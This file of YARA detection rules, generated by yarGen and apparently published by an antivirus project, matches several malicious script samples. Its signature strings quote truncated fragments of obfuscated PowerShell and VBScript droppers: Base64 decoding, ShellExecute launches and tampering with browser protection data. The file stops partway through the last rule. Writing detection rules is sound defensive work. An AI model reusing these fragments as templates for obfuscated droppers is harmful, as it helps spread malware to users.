/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2024-03-27
   Identifier: Script
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule Script_1 {
   meta:
      description = "Script_1"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0153b116e6a412cfd8dbf868de5cae3a8b3303c550eba80a0605ad4acfda6c66"
   strings:
      $x1 = "private const X_HelpCreate_023_0_Message = \"  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f2039" wide
      $x2 = "private const X_HelpCertMappingExamples_004_0_Message = \"  winrm create winrm/config/service/certmapping?Issuer=1212131238d8402" wide
      $x3 = "private const X_HelpInvoke_017_0_Message = \"  winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"\"notepad.exe\"\";Curr" wide
      $x4 = "'private const X_HelpSwitchFilter_005_0_Message = \"  -filter:\"\"select * from Win32_process where handle=0\"\"\"" fullword wide
      $s5 = "private const X_HelpRemoteExample_002_0_Message = \"  winrm get uri -r:srv.corp.com\"" fullword wide
      $s6 = "private const L_HelpSwitchDefaultCreds_004_0_Message = \"Allowed only in remote operations using HTTPS (see -remote option).\"" fullword wide
      $s7 = "private const X_HelpCreate_016_0_Message = \"  winrm create shell/cmd -file:shell.xml -remote:srv.corp.com\"" fullword wide
      $s8 = "private const X_HelpEnum_017_0_Message = \"  winrm enum shell/cmd -remote:srv.corp.com\"" fullword wide
      $s9 = "private const x_HelpAlias_012_0_Message = \"  winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service?N" wide
      $s10 = "private const L_HelpRemoteExample_001_0_Message = \"Example: Connect to srv.corp.com via http:\"" fullword wide
      $s11 = "private const L_HelpProxyPassword_003_0_Message = \"Specifies password on command line to override interactive prompt.\"" fullword wide
      $s12 = "private const X_HelpGet_015_0_Message = \"  winrm get winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935" wide
      $s13 = "'private const X_HelpEnum_014_0_Message = \"  winrm enum wmicimv2/* -filter:\"\"select * from win32_service where StartMode=\\\"" wide
      $s14 = "private const X_HelpFilter_024_0_Message = \"  winrm e wmicimv2/* -filter:\"\"select * from Win32_Service where State!='Running'" wide
      $s15 = "private function ProcessInput(wsman, operation, root, cmdlineOptions, resourceLocator,sessionObj,inputStr,formatOption)" fullword wide
      $s16 = "private const X_HelpSet_019_0_Message = \"  Winrm set winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935" wide
      $s17 = "private const L_HelpCreate_015_0_Message = \"Example: Create a windows shell command instance from xml:\"" fullword wide
      $s18 = "private const L_HelpInvoke_005_0_Message = \"Executes method specified by ACTION on target object specified by RESOURCE_URI\"" fullword wide
      $s19 = "private const L_HelpIdentify_009_0_Message = \"Example: identify if WS-Management is running on www.example.com:\"" fullword wide
      $s20 = "private const L_HelpCertMapping_009_3_Message = \" Enabled - Use in processing if true.\"" fullword wide
   condition:
      uint16(0) == 0xfeff and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule Script_2 {
   meta:
      description = "Script_2"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c1c622dd11fd5ef3adfca6682db7639790ec048ddce7075c837cd8458fa763fb"
   strings:
      $x1 = "    $pgHC = $pgHC=@(@('YXBwLmh0bWw=', 'PCFkb2N0eXBlIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQogIDxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9InV0Z" wide
      $s2 = "    $jEKXa = Get-Process -Name $senay -ErrorAction SilentlyContinue" fullword wide
      $s3 = "                        $JsonData.protection.macs.extensions.$mqmQe.$pjaxMz = (pEaW $XyoVpc ($SID + ( [System.Text.Encoding]::UT" wide
      $s4 = "                        $JsonData.protection.macs.extensions.$mqmQe | Add-Member -MemberType NoteProperty -Name $pjaxMz -Force -" wide
      $s5 = "        $PYE1 = Join-Path -Path $Env:APPDATA -ChildPath ( [System.Text.Encoding]::UTF8.GetString( ( [byte[]] ( 79, 112, 101, 114" wide
      $s6 = "        $n0xi = Join-Path -Path $Env:LOCALAPPDATA -ChildPath ( [System.Text.Encoding]::UTF8.GetString( ( [byte[]] ( 71, 111, 111" wide
      $s7 = "        $Q67Y = Join-Path -Path $Env:LOCALAPPDATA -ChildPath ( [System.Text.Encoding]::UTF8.GetString( ( [byte[]] ( 66, 114, 97," wide
      $s8 = "        $thoPgC = Join-Path -Path $Env:LOCALAPPDATA -ChildPath ( [System.Text.Encoding]::UTF8.GetString( ( [byte[]] ( 77, 105, 9" wide
      $s9 = "                    $JsonData = Get-Content -Raw -Path $PYUmif -Encoding UTF8 | ConvertFrom-Json" fullword wide
      $s10 = "                        $JsonData = Get-Content -Raw -Path $PYUmif -Encoding UTF8 | ConvertFrom-Json" fullword wide
      $s11 = "        $gCMdpF = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String( $T4nbam[0] ) )" fullword wide
      $s12 = "        $jEKXa | Stop-Process -Force" fullword wide
      $s13 = "                        Start-Process -FilePath $Z6swL" fullword wide
      $s14 = "                    $Nw1m = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String( $ZEV6 ) ) )| ConvertFrom" wide
      $s15 = "                    $JsonData.protection.super_mac = ( pEaW $XyoVpc ($SID + ($JsonData.protection.macs | ConvertTo-Json -Compres" wide
      $s16 = "    $zxY0 = [BitConverter]::ToString($NZAY) -replace ( [System.Text.Encoding]::UTF8.GetString( ( [byte[]] ( 45 ) ) ) )" fullword wide
      $s17 = "        $QaV6 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String( $T4nbam[1] ) )" fullword wide
      $s18 = "        if( $hJsF4d -like ( [System.Text.Encoding]::UTF8.GetString( ( [byte[]] ( 42, 46, 112, 110, 103 ) ) ) ) )" fullword wide
      $s19 = "            $QaV6 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String( $T4nbam[1] ) )" fullword wide
      $s20 = "            $mNMgzY = Get-ChildItem -Path $RQC51 -Directory | Where-Object { $_.Name -like ( [System.Text.Encoding]::UTF8.GetStr" wide
   condition:
      uint16(0) == 0xfeff and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule Script_3 {
   meta:
      description = "Script_3"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0231c4a5cd7e1a07cdbaf84df4f635fd6c4acbadf14f817b4004ecbcc3fbd3f2"
   strings:
      $x1 = "\"::==QA7T0O/hsmcA+/wHbmx713OEctWUpt6HAFL3G3bsVqJB7vYFIFd2DIuZyI2+lQ187CgnZ22SlrRAs80GPweZ58UnW42HdxSOYCeJ6eml64zcLDDHPv5MyoMj8w" ascii
      $s2 = "yO3df0fRQ0dQujoguOXB/nYqY/9C2dF7o15ZcHxT12aYa8biniCwY0DimJae0XFTpl5PD1z1X679bVuAOpka7btO/AHWGIrzV40Rz1+NLF0Y2/ZHA9Q+1RbciSH0elNu" ascii
      $s3 = "bQ7KFX5CUNmRRPoP8r/MuK/C+boNk4+c5AxvoNkD9/IsO5xpRx8gzVBnhigrpLEWvPg3rqtsAI3VfIdUp0cB/OBmzCoIDcziPiBHZZERMwcXyQWaYFg8fLK7tbHrVY4+" ascii
      $s4 = "lOg88z1FOKum6ihnUwRxNAvK4CXFiaHZeg3n43JVHy/C+zqfP4eubgPZhLr6rZd0mj+ziAdclv8hoen6bhCQKn+C/jZYvJ6VVl3ugTl6jh3/hlR5Tgzgf3FPz/G8QRPp" ascii
      $s5 = "G4WFFCQSpYZgKH6qqJBUclqB4SgypVPjbliT0boWo4wgKT0fdLtOI6jvFiZK2eig3a0a5V0aqYdNDUhU4PQz7miNnM0XT7Z/C06zK6ngmEqR/E5l4l+p4gcB9cR+ANGo" ascii
      $s6 = "eEa32lLWvuqrZXUKFXdLL7D7LWrnJrAk0eMn1z59xKFtUgsFO4ddmzOdvZGv9nmyfsHP5Xp1DfuGi1ScTn8FzqdlTR9RprAHUNMylbrb2aOApcg61iD/75Xqp9ftTn7j" ascii
      $s7 = "0n2PuFl4K5VeJ/IET/LDxTWxQSmBwTfa7Y4uf5hbKLeO7P200K7XhkzSqTTSFFNSrj5pSK7qP0I8lUtQ8AVtbECbmNCjaQe7pPGkaJNf+FTpmCHQGT21rEnycXXcdBqk" ascii
      $s8 = "VBTdKqEmaW0BM1H16gTT9iI0YKTS7wSmoCyS9NTBFra35mbm3z7latfCJo+jZftPZaEuD5HM129psPTlH9LpVoOP1DMWO7mJForT+ITRwLYy1qGdlFR1V83QO6vMN4oq" ascii
      $s9 = "Yz8EXl7VIrqBTrqom7c3pYqLo0r9gz7QIc+Zuaj3DbhH3lvkTFzsgmyHoEyEQLaEQ7ZeNsn9oTaW4YOHd0G4dqjIBDBupDObRxNzuUfAMs4D+ZIsjVArxaQzKXC9lcq8" ascii
      $s10 = "ENUoDa/XcTRLiOrRlEanqzKNQB1MwJC/JwhCsTg1Ds2gnWe0P/nH16ez/kq8o/H0ezz7cnPAeO1u1HPnf93Fxn+L2sPoOf6P+5W5S/B+4pf4T0f+e7cPpKP6P25W7efB" ascii
      $s11 = "8qRe8hodL1j8ahYZsaIVJV42kqlDittqVgg55Q1qgIrCIV++JTBFPc6OJTLSEGuVdXg1VBQUBWewTDqDp2mqnB16hCXbhnjkBCeCPhOYh7FPw9DGhhi/lWDPDajJ+USe" ascii
      $s12 = "nIjhQAJXNms0GeTTieEwW5JOUDalCKf2ohQby8hsIhK0ZIF5csOnRxkL3AE9GRSinXn7SYWPX+j5VJtTzEPGw1WQhBZ7VacSO5M6JDkA2qNibO7kjErONPITT0ctojDP" ascii
      $s13 = "T3AhuNgqHi7WzqTCwjS38TbUqE5xrtbikquI2ribApfunEeDe6xuWeemC1eQiA7IG/atBsGI7Q9INcqdcqDLlVNKD0fUqA1h7KiJhH6idCgqzYX/CXZ0XSgL/qsxTFg2" ascii
      $s14 = "+aIMxsQ3mpyCKAIgPU/ygnRDWA+6RnZ/g/hVBgsruQ8jHdhcm2ppMVd59kc/zkRS6pHIW6gwi5RUyUaVVuWuHa7UIURLB9p0CrE64dcWXkDy6iOibaBSoj/SZzEIGtE3" ascii
      $s15 = "0kRr4m8u8EKaKpV5E29qJc75HI145yTDX4dibBY196z/JKRhJD9PVSzkVb912Q7DV7rSvm3ct6Vxp5sJfaMcS7vtjyo9cBIWSpUzA0aOazIfDMTB8ApSPYjR29nLVawM" ascii
      $s16 = "7k3cRtXAX752qlrthsYvWjGMGknvv3mNJGHVmI/BVD4eB0GLzpC91NatG6yn/e4unVE5au/i449Quio8SPYN/WRxgOH6qy9Gxy5RNUtECXx/ioob/Nm70TFbkHG6iilw" ascii
      $s17 = "uJqSOCmTV5OdBC6lDj3QrcYJ4i3pP8AtH0DTjwki4X2AN0COIBJEf6NF2U2+5ey8FMpK6RRoSPYASNyEpaR3n7DmIG0Err3iCfmqXrl8gUovDzsZLzeMHshUO8DlFbsh" ascii
      $s18 = "Ez6ClGetFIYnvxAe2xjQOsVLIED7oxJIRPZb4UEYnerFkeBbTldwaIN/h9AyIxt2dBn2yc5OJPDYXiI9hQJy+ADowuVHBgQTcnuOZL6ddpntDIabH7ci1tDkRb4HjROa" ascii
      $s19 = "T5Xn77Wx0yO/rDR8ZG13E+bfmJ6r65g4oRKIOxvHj/v/XAd9duGjxx//FuSfzIOVxC/H4m/yBvlhLHeCOsbbJzr5/BNvxR4uWZ/T2dv5Wi7ikHyUtA+LIRc2Lnu74cGg" ascii
      $s20 = "4RxJ7m3/gOnicMyfUGRbXydndZlo1/QjM13l1Ax2am20aTOcjpdMhChUXjknMOeF+2p+3LdU7sbT/CMs82oea8p9kmxEQKMBuD6w5s4IryFqfy85cKJ0abcWz12G3SJQ" ascii
   condition:
      uint16(0) == 0x6944 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Script_4 {
   meta:
      description = "Script_4"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a8f33cbf55306f09f4181b3766fe7bcd39258c5ec33e4eaa57ab2bb581e23458"
   strings:
      $x1 = "\"::==wLG7zj8novrqoQQ5M8+8D9cqeD/OQzBVw3Dw9O3L10g9f8GQ56KQ08YNzVUsyhTQXCr1uGcZwEJ0siS0SRt4JcNgl4sHKwvE1EMuBdYtCx6JSzejuUVuans2gW" ascii
      $s2 = "ONXhMXlN09e9hiChduKm1E92XKt0EjIS6lb0gLbwzKHGPDJJ/Ka1QArbulJV+/p0c+qElgaDqlbeYYkBOI/TiEb2K76VgvUVWp075qB8kKbIIW5cZX2urch73Wl6enQ+" ascii
      $s3 = "EuK7q87kJ6tsq6wOYdVHAfIDIMB7uqECGVVWRJVXQ8XUV138tz5FWuylRD+HhircYBPafohNmxGuatsuZwiRZMc30FWbkKb2Yw6VD84WVXdVpJ4pVLWo1GYczdDOxKna" ascii
      $s4 = "UnE2k5iElKMmiouYqAia3JenLiCTTD6ESLz6USzyYPizwUng6k3Ui8eT/4tKNHqIPxuTrxX6FL7lOgtU38LQU90/Qi0xLQXy4Mvyctp0iM1tigW0XbMmBZDQbgpCkOAd" ascii
      $s5 = "mfvTa8SnyIkMTi9cWG5YmE5QP5vRa93yfPTPzuXda3tTfbyQeWGOb543Q3hjpndVTfmrlOOzVxMtcjgZqJqtxQOaC+aLwRAlI12EOaliBZevyuFpqqZL51O0lDxNdLln" ascii
      $s6 = "P/YfWDT/fVQxH7zTv2HgEc+mShQhftpTnux0OuZmdMOnfb4333HT869cdXrJCefvvbHp3XX3UV697yaBHf//Uc6//yzpjn3XIb68/yD233n3lewz33j3wc//tnlJ7/Pf" ascii
      $s7 = "lLQ9Ryi5dlLWRbZ3qiD32/VKXImveR1QOY2+urCC8UzyWEY7vhYNXJwbmhSyh6tByHqvQT5g3QkuxL51RRsqYt42cKNgeCSEl7AulCxuaJYVT8Dy9u9yrb46UUvTNwVp" ascii
      $s8 = "CBQKHG1lx7m2y2E0gY2XEaSRqGRqqWVjraQqSqqstphoKadJQl0okFkQHUKJSidpAU2ZUzgxG5DZ1BqIrcQWriKBu8ZWHT/Cep2BEx88z/nhNlNgqTB8bV2S4J1FhKvh" ascii
      $s9 = "TdAy3tM5APvvQaR8VsUFASVqElEs1YK9tQks4OVsvzJPzyBxOhEOGa7qbBpeLIx6EGLOp4uCRZqF0B7CUbDosbIpi7RpoVnDVu1p0+CfTh/oL0hUc4yoV4QFJaoLYiRC" ascii
      $s10 = "oRJtNSJyZ1NQJ/K3HTvZV6YLViBbk81KTZ9IZMVe+eaR1ifZ4CgWavJR2I0KhPb3C0GeTo0xQqkI/eDEE3OvzVf9wgna4+HnFVvRT6o455rAZP5yYXd5XvDqfxr6+lLj" ascii
      $s11 = "FtptyFMtLhpSo6qGIpI6R3CixFr+oVxmaHQV+LwftV+6bBSVLc5xzhS7hef3IaxErdVeODXbgllW4y4wkXWZsuloNNGbpoQcLlFiD5tUUIuGmXbRWutHZZ2esFZ51Wkl" ascii
      $s12 = "2pbQtRR8Fdg0SDVr5kQ5T/F/WeaOPlWo8LtLqVKvu18X9JxV5p0JgGr+I3ORNkuG0cF6jB8nPVRuBKWRLVuIHloGumfvur4rU9bJfzfIeif5TqWi6Z9/GnP+LSm6LQDV" ascii
      $s13 = "1PZ3exUZzh5LU3Esl2GLGKSvNj3nsKiP1TxUIPM0tyJzMZC5wJOtWVInb00e/89DsSn+kKxoWLK4XP/iaoJ2y6Otfd0af5BHIB4DJnewkHmJcLKdLLHWsvE0oek58mWj" ascii
      $s14 = "lwYhyqUSn1wjOrpE8v1SBGT+4a0pyq7vAt7oU2lo3hI0VCLzqPghhLWHTHScijSh0ZiFMmNmgFSUfErOpsVfAqQXJa6tog9sYyydQwYZREW4JtcoGECqMoUedllmCpQW" ascii
      $s15 = "6AXIBrY2pS4nooo9rQXQbQ6NVlSPlzKf57oGKQH3HgIraiSCE2EYE2gYBr0hLAG6aHoQgmYMiBgSiyBiE4sQ4gYGANodogBTDAdAzmCBAMos1NAmj+G8B4dIvRUAoOIs" ascii
      $s16 = "sfyMReo5yS6r8wF/Kem4L6fWc1iap4xiWI9QhCswaKeV5bFfIc+wPrfUcXhdLcsFWiwMGebhV3XHdv2359ervt4dTvb7ftP+OH613qfpR/1PH6+bx38vO3623nRnftz9" ascii
      $s17 = "mYVsfeQFGBHq+zLIz6uR9HaE/DtZQY0fywuR8rAv2XK1hEoDP5RCyOfBVgEt20PdFpSoO24HCj/gEOrLFJptYGB/zFgKj2njboc/V60Z6CD+OIulK6GimWuPJ9CIrZqN" ascii
      $s18 = "rXtwchoOH74T7I4EN+p9iEIdIekxKIHIRcqs6xMEELVGXu6uC3w81O10XFMEDrZUgsnpShj/WnMM+iY5tdwP6EZDMckN6R15EQ+RiIvV9yZwsg5wehiu6tyA7RbpFQ/E" ascii
      $s19 = "4cW/vQri/ZoPlhaU+FVd1wUGbrh3kGCH/Y8BOdGaKqDaqi2PQdLli6S3rpdY+4vpvEMsegdh2bTZjc/oEceceK0mUKGOO6l19LPCg18+bI2zjj0zqG68R/Nd+1U28WwT" ascii
      $s20 = "O/c4KI+wJoLLIGSaD1aQnbi3jZ0yW8DCxNA0PKW7pBDOnbSwnVLhZ7AVnA7xREXjm51glfkYWaEvEyEiOA0UH6sTJvLJ/JeWAjoMblotEF6A/Y7fQDR/HoRUvOB4rA8i" ascii
   condition:
      uint16(0) == 0x6944 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Script_5 {
   meta:
      description = "Script_5"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b3f2c0468d40628a6fa17d8dfaca76b89525063c9f1c3b337f9929311e4d7cfe"
   strings:
      $x1 = "\"::==AA/f7B+/9/UGb4wRcOxb+o9/7DevC1uym86DeJLc2lsjI767STj4BzYqUdDDm1a7s9+pumm7NLvfX3l5OvXCk2Zr/tHci8qj92ebz17s73SzNfqyVFQ6bu9svp" ascii
      $s2 = "f7j3w1tNzdUmpOmNn9bO4GuncTcjfDVU3tlfaW68MfO6O6c53Hw0sjAnXOuDcfQANvvYRxOQCL75J/rh/mz15Ez9l8Ub8DnrHLItvYMgDZ65dOmhyLzUd2CTukMnjurm" ascii
      $s3 = "zp2ZQjjhzS9cKX7iYom8jiaXlRHsLNv64fk6SUSGuPhQqdmdtTSO+RnwzRyZzcxaPk8FPASskj8ZMS08UsyUvEt6CIXUrMJ215ytM1w50sGFrQkntx3nwTOCysdCzr68" ascii
      $s4 = "oNIghVpwRbBXynPiPEB3jR9acISA0j+m+K3CHwV49ZfZsEvJpzMviHj6JzrXwS5ESmPEuQ0c2PCbH6B5hkcOzVaBIDhlB9DQWQIMQPYtkwyjiA0LGJi0dSHJsDQCduKG" ascii
      $s5 = "r229Wu/cXSfZeyeGE7Qq9eYWRbxqt5ua7mNzmjJf6PNtvXn1/V+q+1d+tj9AwjE7vWfy1Xx27t+kXipN0mgs1x3aSKbfc+G783vcy2wc8A/aHi+g1NpTiGgq9hdleH3t" ascii
      $s6 = "u0AKnR5OP0DkagIzN9wygt1fEliMLiv4z2nvjVmVhq/3SLCZ7jHas7OsCtY7fqsF+OtKI4Y2LBSFwGeTlNuoQY+NTs2+FVkeCPwwsQocWf0g1qOW3gw1Eje0pzEkLWqL" ascii
      $s7 = "CXWOWXDXwX2Y1DjHrjhz7LaOF4M3rdRyUd1hafdPQTpiqjAMZrzha4sco+HpmsT51S2OWXDGI9nlp/F2MWX7nya2B4qvdGUZHlOGSry4+nzZ/8t2R52oFy9VXXHe4cIN" ascii
      $s8 = "eUTsPnjbugZUt+34ZqN/j3MsHlbBkbpCjdjF8R0wdb0Mjm7Lc7CpNJc2+aHDz9XjAkHCvt2h9vhjNYgs9CbyJXvWEyejl9pxUj7lLQMeOnrmuh9VDb9RHTu51fjxSF8n" ascii
      $s9 = "Htg9ngBMeA6AxlsO2vRugeTUH2nClAGHJkVNjzWC5DQtjMHLBE6ZNF2ldGk2nRGjuRUDMiMcUlQDgezL5y/PoByK1LGzLURoLZrNlgxMuJ0Cq3MPJUUoPsvEOU0Z2XC3" ascii
      $s10 = "1Rr6l8MK7pYGEJHXuSV/DoTM6f78nFbeXGuQkXWZqFqOIidNnVYyh6LJsvgveUJqW9fe49/Bch+1tpn+ENdfsPybLByQVHDuVeIUyNgPR/b3t3P07Mj040EBHEuNJ4Y3" ascii
      $s11 = "4oQtZAgIvmP0cdqs7W/NtHshf7zhuN//emYfNipbllsdBmz+ueGitO8ZWngvFYg1MhnQOEzdSehqQP824eAegJQvLvY20M0bTrvh+4GiyrMiGU/6lxlGmGRjV9OEpSnD" ascii
      $s12 = "AslkHA+VT6Lh7Bh/gAsrOP0I+pkeusB790r6KDVb2x82soEuauvZEw1yjRR5jGGuPV4BkLisYbE0l9tBdf+3TXk02V3AfbmedLlPvgprK+TpeaZeMjHE7IxD5eNqUKuG" ascii
      $s13 = "kKtKqI8VD4dtd5XgFoMXEyEeBE2YFpaASMHRbx+cYm/m0gh2XiUyor3+EMuLpRjAXDF4MjWOaZDcSIMEIeOLapOiQZ7MqcyIh5lGSn6aqlkilHWzQ4GK8KXdn/Poj0H/" ascii
      $s14 = "oI4BLJYQH4sEqilOgrIC9HROz4BygX46C8HdCwIEHwqBQQCH9we6F3M8Hw/EyIm2vKK4eZvNGvfBXMRGz4+PNPkpyhdKueSSQU7FFzonN+JImWMoi2Oa4XNyEQATBgOr" ascii
      $s15 = "oOIm11b9scSRvbGRvVUspYAULVn2Q2MvoMKSEbA5Ts+GbJ6xddP5KTJ8uvkpC+AMKu30/c/j8q/ebqXBZ3ihPOGNMMOA+wKAYLh8hV1Jhw4s8AFXZX2iSNbcFTs0hF/g" ascii
      $s16 = "heYEr8WuQROIFC1MJYU0IBx2NoWB0VjEILxF5FsxFTkEOvTy4fsvALRZBVMSIjnZmxTMHWr0+YbqMCMsjzwekNXkaEHQiDo05XKLSx7rabEwYxzdHHvYX0iNyxigENMi" ascii
      $s17 = "ZBUmbc/ci1TFmQEU4+wQQw1QYm2qnfI17nDtTChk03bu3E6ddrOEphgkBb4t6ykwIEYm0LD43p1gETm+p0XFFCY3mL9vF8bB9Da+pjZK9EwXDShMXs/hoUqjFTkp5yw+" ascii
      $s18 = "w7O/QW8uFAuY6uieje93r0fuf4X01afQvm7W+quV0n0VePQ/3dIfRnF3v0vu74X0lZfRvk7R+iux0n0FdvRvRXo9B9CuP5fd/hPpfV/QPv7V+suO0n0ZfvQPr7U+geTu" ascii
      $s19 = "/gsyucChc+nPy2s//Fs9XuPH2Ot6vwo1yH4Nuf3+8oW9tqYHP03kjKTVfEImMNdYUMcnJumNbK6J7u7C1e0a0vu2cHuufI/TFn6DLOgKLMZ5pclIDoxPbb+AfL47fk+a" ascii
      $s20 = "fwSBm48tBhOHpeNqFMfnbfHtpQ5JDJd01KquQLzxeyzfiU5zZsHKaqo27i6+yCelflJDG9b6644QrGsMl9DRRaiKgcogETVpDjgrRvBKU1zn5iSeAp2GwwrfuxUO2jLs" ascii
   condition:
      uint16(0) == 0x6944 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule Script_6 {
   meta:
      description = "Script_6"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7c50209f50ce49960450dec8780918a112576c2034ac10d70e569693434bc23a"
   strings:
      $s1 = "H1 = H1 & \"++$quicksteppe;++$quicksteppe;$quicksteppe=$quicksteppe-1;Function Lystprincipperne ($frankfurth){$Putricide=5;$Putr" ascii
      $s2 = "H1 = H1 & \"smod Fejl Venda-KontoDNrgaaeRavnes.rmort,roteiR,dzinBroomaSoubrt Ne.li candoSilicnAlc a  Dish$ RefoT Antee HjernPsyc" ascii
      $s3 = "Private Const Idealitetens = \"Tidsstemples kinesiologies:\"" fullword ascii
      $s4 = "Private Const Execeptional = &HFFFF8012" fullword ascii
      $s5 = "Gennemanalyseret.ShellExecute Adjectional,Trikolores,\"\",\"\" ,Upopulreste" fullword ascii
      $s6 = "Private Const Mikroprocessorens = &HFFFFB8BA" fullword ascii
      $s7 = "Private Const Bereten = \"Terminalprocesserne: unmagistrate; flgevirkningernes\"" fullword ascii
      $s8 = "Private Const Vltepeterne = \"Tankeprocesser firmamenters91 subatom spidsfindigheden,\"" fullword ascii
      $s9 = "Private Const Ministerposters = \"Winepot spoofs opiumen54\"" fullword ascii
      $s10 = "Private Const Pjankendes = \"Jeane torrentine extemporizers:\"" fullword ascii
      $s11 = "Private Const Astrologiers = \"Zirconofluoride tilsmagendes\"" fullword ascii
      $s12 = "Private Const Fangot = \"headshaker biologises\"" fullword ascii
      $s13 = "Private Const tvangssalgets = -43022" fullword ascii
      $s14 = "Private Const Monologized = -15349" fullword ascii
      $s15 = "Private Const Undeduced = \"Togrevisorernes123 systematiseret:\"" fullword ascii
      $s16 = "Private Const Raakids = \"Millimeterretfrdigheds afdelingslgernes? vandalroot kofeminismer:\"" fullword ascii
      $s17 = "Private Const Eksegets = -62311" fullword ascii
      $s18 = "Private Const Toksikolog = -15238" fullword ascii
      $s19 = "Private Const Noncircuited = -23490" fullword ascii
      $s20 = "Private Const Strmforbrugets = -30866" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_7 {
   meta:
      description = "Script_7"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "aeff431cde6f10580b664967efe9793aa19130934b0e9f9d01d152e028fa3f2a"
   strings:
      $s1 = "Pr0 = Pr0 + \"++$Uligheden;++$Uligheden;$Uligheden=$Uligheden-1;Function Semiobjectively ($Eksekutionspelotonernes){$Borers=5;$B" ascii
      $s2 = "Pr0 = Pr0 + \" $Snoreassistenter;&($Evittate) (Semiobjectively 'TenanSAs.autParama Coc.rBreevtSulte-ForsvSs lenlNvnineDastaeStar" ascii
      $s3 = "Dicycle.ShellExecute Nstmindst,Arbejdsbyrderne,\"\",\"\" ,Cerebralizations" fullword ascii
      $s4 = "'Servicefagets nonusers" fullword ascii
      $s5 = "Nstmindst = Nstmindst + \".exe\"" fullword ascii
      $s6 = "iWSa.dsi ellinA tovd.nertoSubcowVakresSad,ePPriveo ,rstw Freye Plu rBals.SCharthAntroeSkriflSm,dslPasto\\Enw,evPaag 1Handi. Sati" ascii
      $s7 = "Aurisbioteknikk = Replace(Aurisbioteknikk,Command,String(4,\"L\") )" fullword ascii
      $s8 = "Set Rhymesters = GetObject(\"winmgmts://./root/default:StdRegProv\")" fullword ascii
      $s9 = "'Boggle comtemplate coralwort" fullword ascii
      $s10 = "rers++;For($Adresseringens=5; $Adresseringens -lt $Eksekutionspelotonernes.Length-1; $Adresseringens+=$Borers){$Hydrophthalmia =" ascii
      $s11 = "Hun,r(Katho$ blaaT portrShrofiGyn ef S mkoSprourPa.vin Havfi TilbaDorma)Sm.re ');&($Evittate) (Semiobjectively ' Hykl$ProcuAFin," ascii
      $s12 = "UdesttHjemk.CiselEA rivnRawbocDicraoVelvedSt,liiF,repnC lengDrble]Salam:Du,fo: MetaAFluorSHenveC.fbrnI SkalIEncom. jeneG.mplee P" ascii
      $s13 = "Pr0 = Pr0 + \" $Snoreassistenter;&($Evittate) (Semiobjectively 'TenanSAs.autParama Coc.rBreevtSulte-ForsvSs lenlNvnineDastaeStar" ascii
      $s14 = "'Circuitable, accepteringer undertrkkenes" fullword ascii
      $s15 = "aans M.al= Tryk$ deflAMetapcCa.thqLocaluBestiiPreprrUndeleTi borOmmatsKruk,. .pvasKlynguGalu bIntersYodletAlli rForuniKretunUnrh" ascii
      $s16 = "ee In.orWedgetFlygl]Quinq:Skole:F,rskFInex raposto pbygm E uuB SynkaHaandstelefeDeter6Bo tk4 KapiS ,ladtMarmorUbefoistenhn integ" ascii
      $s17 = "'kodestrenges androconia, plymouth epilogen" fullword ascii
      $s18 = "zi_ BegrpUtensr CompoWhirscPatrie Liers Cho s,mbus Pukke-FilanF Ungo Sy taPHiragrPaleooRedrecYndigeCoat,sSlitts Dux,IProfidFa,ve" ascii
      $s19 = "Pr0 = Pr0 + \"++$Uligheden;++$Uligheden;$Uligheden=$Uligheden-1;Function Semiobjectively ($Eksekutionspelotonernes){$Borers=5;$B" ascii
      $s20 = "vely '  romI StatmA.grap GelooEpoperworkstDatte- PlouMT rnsowaysbdOrie u Tab.l  mvieRa.ba By,geB Tenai Mi,ptResols FataT busbrMa" ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 30KB and
      8 of them
}

rule Script_8 {
   meta:
      description = "Script_8"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "df6591b61f1031d7f2cc290c1c0009f8de4b5e96b03870b8c58dc61f4b2d3047"
   strings:
      $s1 = "s3 = s3 + \"++$Strikkebogens245;++$Strikkebogens245;$Strikkebogens245=$Strikkebogens245-1;Function Spydkastet ($Aftalesystemerne" ascii
      $s2 = "s3 = s3 + \"imt Cam imealtn Mou.aOrigitS uttiAffreoComprnKrges  Ston$GreeiABergemHjemvo MarklRebeniRumsksBesluhNeuro ';&($Matric" ascii
      $s3 = "Udvejs.ShellExecute Sionite,Krystalkasses,\"\",\"\" ,Becomma" fullword ascii
      $s4 = "'Servicefagets nonusers" fullword ascii
